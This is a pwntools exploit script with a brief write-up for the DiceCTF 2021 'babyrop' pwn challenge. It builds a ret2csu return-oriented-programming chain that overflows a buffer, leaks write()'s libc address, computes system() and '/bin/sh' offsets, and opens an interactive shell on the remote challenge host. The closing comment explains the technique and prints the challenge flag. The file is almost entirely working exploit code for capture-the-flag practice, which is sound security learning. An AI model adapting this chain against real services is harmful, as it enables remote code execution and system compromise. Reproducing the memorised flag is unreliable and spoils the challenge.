#!/usr/bin/env python3

from pwn import *

exe = ELF("babyrop")

context.binary = exe
context.log_level = 'debug'

# Padding
padding = bytes("a"*72, 'utf-8')

# Important addrs
main_plt = p64(0x0000000000401136)
write_plt = p64(0x0000000000401030)
pop_rdi = p64(0x00000000004011d3)
pop_rsi = p64(0x00000000004011d1) # also pops r15, so maybe we need some filler bytes
init_ptr = p64(0x4000f8) # used when addr derefernced in 2nd csu gadget, found using search-pattern [addr of _init]
write_got = p64(0x404018)
ret = p64(0x000000000040101a)
# __libc_csu_init Gadgets: Universal ROP
pop_time = p64(0x00000000004011ca) # Pops rbx,rbp,r12,r13,r14,r15
load_args = p64(0x00000000004011b0) # Loads the 3 args into write() and calls function dereferenced by pointer addr calculated as r15+rbx*8

# Offsets from libc6_2.31-0ubuntu9.1_amd64
write_off = 0x1111d0
sys_off = 0x055410
sh_off = 0x1b75aa

# Payload 1: Leak an address
payload1 = padding + pop_time + p64(0) + p64(1) + p64(1) + write_got + p64(8) + init_ptr + load_args + bytes("a"*48, 'utf-8') + ret + write_plt + main_plt
## rbx + 1 must equal rbp to get the exploit going. That's why the 3rd and 4th elements in the payload are needed.

def conn():
	if False:
		return process([exe.path])
	else:
		return remote("dicec.tf", 31924)


def main():
	r = conn()
	r.recvuntil(":")
	#gdb.attach(r, '''
	#b *0x0000000000401165
	#x/50x $sp
	#''')
	r.sendline(payload1)
	leak = r.recvuntil(":")
	leak = u64(leak[:8].strip().ljust(8, b'\x00'))
	print("Leaked write addr:" + str(hex(leak)))
	base = leak - write_off
	print("Base addr:" + str(hex(base)))
	system = p64(base + sys_off)
	bin_sh = p64(base + sh_off)
	payload2 = padding + ret + pop_rdi + bin_sh + ret + system
	r.sendline(payload2)
	r.interactive()


if __name__ == "__main__":
	main()


################################## Write-up ####################################
# CTF: DiceCTF 2021
# Category: pwn
# Challenge: babyrop
# Author: joshdabosh
# Points: 116 (solved after CTF)
# Description: "FizzBuzz101: Who wants to write a ret2libc" nc dicec.tf 31924
#
# So basically I thought it was going to be a ret2libc like in the description,
# but it wasn't. Instead of the typical puts() being used to leak an address,
# there was a write() function that required 3 params. I used ROPgadget at first
# to get 2 gadgets to pop rdi and rsi, but I couldn't fin on for rdx. So, Sammy
# gave me a hint to look into Universal ROP, and eventually my research led me
# to discover ret2csu, a special ROP technique where there are 2 gadgets within
# the function __libc_csu_init that you could use to pass 3 args (see above
# comments). So, I used that to solve the challenge, and now at midnight I have
# finally got the flag. :)
#
# Flag: dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}
#
# Solved by: Ryan Nguyen
###############################################################################
